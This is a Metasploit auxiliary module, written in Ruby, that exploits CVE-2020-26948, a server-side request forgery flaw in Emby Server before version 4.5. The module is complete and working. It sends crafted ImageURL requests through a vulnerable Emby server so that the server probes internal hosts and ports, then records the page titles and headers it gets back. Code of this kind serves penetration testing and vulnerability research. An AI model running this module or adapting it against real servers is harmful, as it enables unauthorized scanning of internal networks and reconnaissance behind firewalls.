##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/btnz-k/msf_emby
# Exploit Title: Emby SSRF HTTP Scanner
# Date: 2020.11.17
# Exploit Author: Btnz
# Vendor Homepage: https://emby.media/
# Software Link: https://emby.media/download.html
# Version: Prior to 4.5
# Tested on: Ubuntu, Windows
# CVE: CVE-2020-26948
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Capture
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Emby SSRF HTTP Scanner',
      'Description' => '
      Utilizes the SSRF vulnerability in Emby Server prior to 4.5.0 to attempt to pull the
      title tag from internal websites. Based on the vulnerability CVE-2020-26948.
      ',
      'Author' => 'Btnz',
      'Version' => '1.0.2020.11.17.01',
      'License' => MSF_LICENSE
    )

    deregister_options('VHOST', 'RPORT', 'FILTER', 'INTERFACE', 'PCAPFILE', 'SNAPLEN', 'SSL')

    register_options(
      [
        OptBool.new('STORE_NOTES', [true, 'Store the captured information in notes. Use "notes -t http.title" to view', true]),
        OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),
        OptString.new('EMBY_SERVER', [true, 'IP to scan (eg 10.10.10.18))', '']),
        OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server (e.g. 8096)', '8096']),
        OptString.new('PORTS', [true, 'Ports to scan (e.g. 22-25,80,110-900)', '80,8080,8081,8888'])
      ]
    )
  end

  def run_host(target_host)
    # Do some checking to ensure data is submitted
    dports = Rex::Socket.portspec_crack(datastore['PORTS'])
    raise Msf::OptionValidateError, ['PORTS'] if dports.empty?

    # loop through the IPs
    dports.each do |p|
      vprint_status("Attempting http://#{datastore['EMBY_SERVER']}:#{datastore['EMBY_PORT']}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}")
      uri = "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}"

      res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])

      # Check for Response
      if res.nil?
        vprint_error("http://#{target_host}:#{p} - No response")
        next
      end

      # Retrieve the headers to capture the Location and Server header
      # Note that they are case-insensitive but stored in a hash
      server_header = nil
      location_header = nil
      if !res.each_header.nil?
        res.each_header do |key, val|
          location_header = val if key.downcase == 'location'
          server_header = val if key.downcase == 'server'
        end
      else
        vprint_error("#{target_host}:#{p} No HTTP headers")
      end

      # If the body is blank, just stop now as there is no chance of a title
      vprint_error("#{target_host}:#{p} No webpage body") if res.body.nil?

      # Very basic, just match the first title tag we come to. If the match fails,
      # there is no chance that we will have a title
      rx = %r{<title>[\n\t\s]*(?<title>.+?)[\s\n\t]*</title>}im.match(res.body.to_s)
      unless rx
        vprint_error("#{target_host}:#{p} No webpage title")
        next
      end

      # Last bit of logic to capture the title
      rx[:title].strip!
      if rx[:title] != ''
        rx_title = Rex::Text.html_decode(rx[:title])
        if datastore['SHOW_TITLES']
          print_good("#{target_host}:#{p} [C:#{res.code}] [R:#{location_header}] [S:#{server_header}] #{rx_title}")
        end
        if datastore['STORE_NOTES']
          notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header } # , uri: datastore['EMBY_SERVER'] }
          report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)
        end
      else
        vprint_error("#{target_host}:#{p} No webpage title")
        next
      end
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
  rescue ::Timeout::Error, ::Errno::EPIPE
  end
end
